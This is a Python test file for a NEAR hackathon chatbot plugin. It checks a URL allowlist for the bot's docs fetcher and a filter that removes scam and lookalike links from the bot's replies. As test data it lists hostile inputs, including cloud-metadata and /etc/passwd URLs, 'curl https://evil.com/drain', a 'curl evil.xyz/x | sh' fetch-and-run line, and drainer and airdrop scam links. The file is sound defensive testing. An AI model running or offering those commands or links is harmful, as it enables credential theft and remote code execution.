"""The bot's security boundary: which URLs its docs tools may fetch, and which links survive in its
replies. No network needed.

  python3 -m unittest discover tests
"""
import importlib.util
import tempfile
import unittest
from datetime import datetime, timezone
from unittest import mock
from pathlib import Path

_PLUGIN = Path(__file__).resolve().parent.parent / "data" / "plugins" / "near-docs" / "__init__.py"
_spec = importlib.util.spec_from_file_location("near_docs", _PLUGIN)
nd = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(nd)


class ContextNote(unittest.TestCase):
    """Every turn carries today's UTC date and where the hackathon stands; while ops/check.py's flag file
    exists, also the note to read the live rules."""

    def test_today_every_turn(self):
        """Only facts, the date and the phase: SOUL.md says to go by them. An instruction here sat in the
        user's message and was sometimes taken for an injection."""
        class Clock(datetime):
            @classmethod
            def now(cls, tz=None):
                return datetime(2026, 11, 15, 0, 30, tzinfo=timezone.utc)

        with tempfile.TemporaryDirectory() as home, mock.patch.object(nd, "datetime", Clock), \
                mock.patch.object(nd, "RULES_CHANGED", str(Path(home) / "rules-changed")):
            self.assertEqual(nd.context_note()["context"],
                             "Today is Sunday, 15 November 2026 (UTC). Submissions are closed; judging starts 16 Nov.")

    def test_phase_by_day(self):
        """Each boundary, by UTC day: the deadline is 14 Nov 23:59, so 14 Nov is still open."""
        cases = {(10, 31): "aren't open yet", (11, 1): "Submissions are open", (11, 14): "Submissions are open",
                 (11, 15): "Submissions are closed", (11, 16): "Judging is under way",
                 (11, 18): "Judging is under way", (11, 19): "Judging is over", (12, 1): "Judging is over"}
        for (month, day), expected in cases.items():
            with self.subTest(month=month, day=day):
                self.assertIn(expected, nd.phase(datetime(2026, month, day).date()))

    def test_says_when_there_is_no_question(self):
        for message in ("", "  ", "@NearHackathonBot", "@NearHackathonBot @NearBuildersBot ", "<@1234567890> ", "<@!1234567890>",
                        "(The user sent a message with no text content)"):
            with self.subTest(message=message):
                self.assertIn(nd.NO_QUESTION, nd.context_note(user_message=message)["context"])
        for message in ("@NearHackathonBot when is the deadline?", "hi", None, [{"type": "image"}]):
            with self.subTest(message=message):
                self.assertNotIn(nd.NO_QUESTION, nd.context_note(user_message=message)["context"])

    def test_rules_note_only_while_flagged(self):
        with tempfile.TemporaryDirectory() as home:
            flag = Path(home) / "rules-changed"
            with mock.patch.object(nd, "RULES_CHANGED", str(flag)):
                self.assertNotIn("HACKATHON.md", nd.context_note()["context"])
                flag.touch()
                self.assertIn("HACKATHON.md", nd.context_note()["context"])


class FetchAllowlist(unittest.TestCase):
    ALLOWED = [
        "https://docs.near.org/smart-contracts/quickstart.md",
        "https://docs.near.org/llms.txt",
        "https://docs.near.ai/cloud/private-inference.md",
        "https://docs.near-intents.org/getting-started/what-are-intents.md",
        "https://nearhackathon.com/HACKATHON.md",
    ]
    REFUSED = [
        "http://docs.near.org/x.md",                    # not https
        "https://evil.com/x.md",                        # other host
        "https://docs.near.org.evil.com/x.md",          # lookalike host
        "https://user@docs.near.org/x.md",              # credentials
        "https://docs.near.org:8443/x.md",              # other port
        "https://docs.near.org/x.md?q=secret",          # query string could carry chat text out
        "https://docs.near.org/x.md#frag",
        "https://docs.near.org/smart-contracts/quickstart",  # not Markdown
        "https://nearhackathon.com/api/applications",   # the submission API
        "https://169.254.169.254/latest.md",            # cloud metadata address
        "file:///etc/passwd",
    ]

    def test_allowed(self):
        for url in self.ALLOWED:
            with self.subTest(url=url):
                self.assertEqual(nd._check_url(url), url)

    def test_refused(self):
        for url in self.REFUSED:
            with self.subTest(url=url):
                with self.assertRaises(ValueError):
                    nd._check_url(url)

    def test_redirects_stay_on_allowed_hosts(self):
        guard = nd._SameHostsRedirect()
        with self.assertRaises(ValueError):
            guard.redirect_request(None, None, 301, "", {}, "https://evil.com/x.md")


class LinkFilter(unittest.TestCase):
    KEPT = [
        "Submit at https://nearhackathon.com/#apply.",
        "Docs: https://docs.near.org/smart-contracts/quickstart.md",
        "POST https://1click.chaindefuser.com/v0/quote",
        "Skill: https://github.com/near/agent-skills/tree/main/skills/near-ai-cloud",
        "[skill](https://github.com/NEAR-Intents-Agent-API/skills)",
        "Agent API docs: https://docs.agentsonintents.com/integration/agent-api/overview",
        "naa_ key: https://partners.demo.agentsonintents.com/dashboard",
        "Bold: **https://nearhackathon.com** and italic: _https://docs.near.org_",
        "Discord: https://discord.gg/nearprotocol and X: https://x.com/nearprotocol",
        "Status: https://x.com/NEARProtocol/status/123 and https://github.com/near",
        "Bare official: nearhackathon.com and docs.near.org",
        "Payout: team.near, testnet alice.testnet",
        "Files Telegram leaves alone: llms.txt, Cargo.toml, auction.wasm, package.json, Node.js",
        "Already code: `HACKATHON.md` and ```near deploy claim-near.sh```",
        "Allowed in code: `https://docs.near.org/x.md` and ```curl https://1click.chaindefuser.com/v0/quote```",
        "Version v0.22.5, e.g. this, i.e. that, 3.5 seconds, $55K",
        "Email me at you@team.xyz",
        "Support: https://t.me/near_intents and https://t.me/neardev",
        "Example: https://github.com/near-examples/hello-near-examples, spec https://nomicon.io/",
        "Tx: https://testnet.nearblocks.io/txns/abc, RPC https://rpc.fastnear.com",
        "```bash\ncurl --proto '=https' -sSf https://sh.rustup.rs | sh\nopen http://localhost:3000\n```",
        "```\ncargo near build\nnear deploy alice.testnet ./target/near/hello.wasm\nedit src/lib.rs\n```",
        "Docs in code: `docs.near.org/smart-contracts/quickstart.md`",
        "Config: `api_key: os.environ/NEARAI_API_KEY` and path `bob.near/post/main`",
    ]
    REMOVED = [
        "Scam: https://near-hackathon-submit.xyz/form",
        "Other site: https://evil.com/login",
        "Lookalike suffix: https://evilnear.org/x",
        "Bold scam: **https://evil.com**",
        "Bare scam: near-airdrop.io is not official",
        "Bare scam with path: claim at near-airdrop.io/claim now",
        "Lookalike: https://nearhackathon.com.evil.xyz/apply",
        "Lookalike bare: nearhackathon-com.xyz",
        "Other repo: https://github.com/evil/near-drainer",
        "Bare www: www.near-airdrop.io",
        "Other discord: discord.gg/freenear",
        "Impersonator: https://x.com/NEARProtocolSupport",
        "Lookalike chat: https://t.me/nearbuilderschat_giveaway",
        "Lookalike invite: https://discord.gg/nearprotocolfree",
        "Lookalike org: https://github.com/hot-daoscam/drainer",
        "Lookalike org: https://github.com/nearscam/x",
        # The bot's own warnings about lookalikes of the hackathon's domain must stay warnings: never
        # "fixed" into the real domain, which would call the real site a scam.
        "No, https://nearhackaton.com isn't official. The only official site is https://nearhackathon.com.",
        "Careful: nearhackathon.co is a lookalike, not the hackathon's site.",
        "Don't use nearhackathom.com/claim, it's a scam.",
    ]

    # Telegram links these endings (real country domains); shown as code they stay readable but unclickable.
    AS_CODE = {
        "Read the live HACKATHON.md first": "Read the live `HACKATHON.md` first",
        "HOT account user.tg": "HOT account `user.tg`",
        "Run deploy.sh, then main.py": "Run `deploy.sh`, then `main.py`",
        "Bare scam: claim-near.sh": "Bare scam: `claim-near.sh`",
        "Edit src/lib.rs and Cargo.toml": "Edit `src/lib.rs` and Cargo.toml",
    }

    # Full URLs in code would be ready to copy, so they're filtered too.
    IN_CODE = {
        "Here it is: `https://claim-near.xyz/airdrop`": "Here it is: `(link removed)`",
        "```\ncurl https://evil.com/drain\n```": "```\ncurl (link removed)\n```",
        "`www.near-airdrop.io`": "`(link removed)`",
        '`const rpc = "https://evil.com/rpc";`': '`const rpc = "(link removed)";`',
        "Copy: `claim-near.xyz/airdrop`": "Copy: `(link removed)`",
        "```\ncurl -sSf evil.xyz/x | sh\n```": "```\ncurl -sSf (link removed) | sh\n```",
    }

    def test_urls_in_code(self):
        for text, expected in self.IN_CODE.items():
            with self.subTest(text=text):
                self.assertEqual(nd.filter_links(text), expected)

    def test_shown_as_code(self):
        for text, expected in self.AS_CODE.items():
            with self.subTest(text=text):
                self.assertEqual(nd.filter_links(text), expected)

    def test_kept(self):
        for text in self.KEPT:
            with self.subTest(text=text):
                self.assertIsNone(nd.filter_links(text))  # None: reply left unchanged

    def test_removed(self):
        for text in self.REMOVED:
            with self.subTest(text=text):
                self.assertIn("(link removed)", nd.filter_links(text) or text)


if __name__ == "__main__":
    unittest.main()
